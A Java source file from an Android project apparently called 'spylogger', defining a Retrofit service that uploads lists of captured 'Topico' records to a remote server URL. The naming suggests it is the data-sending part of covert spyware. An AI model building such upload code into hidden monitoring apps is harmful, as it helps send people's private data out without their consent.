package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.helpers.RequestInterceptor;
import com.gravatasufoca.spylogger.model.Topico;

import java.util.List;

import okhttp3.OkHttpClient;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

/**
 * Created by bruno on 01/12/16.
 */

public class SendDataService implements Callback<Boolean>{



    private Retrofit retrofit;

    private SendDataInterface sendApi;

    public SendDataService() {
        OkHttpClient.Builder client = new OkHttpClient.Builder();
        client.addInterceptor(new RequestInterceptor());

        retrofit=new Retrofit.Builder()
                .baseUrl(SendDataInterface.url)
                .client(client.build())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        sendApi=retrofit.create(SendDataInterface.class);
    }

    public boolean enviarTopicos(List<Topico> topicos){

        Call<Boolean> resp=sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
        return true;
    }

    @Override
    public void onResponse(Call<Boolean> call, Response<Boolean> response) {
        response.body();
    }

    @Override
    public void onFailure(Call<Boolean> call, Throwable t) {
        call.toString();
    }
}
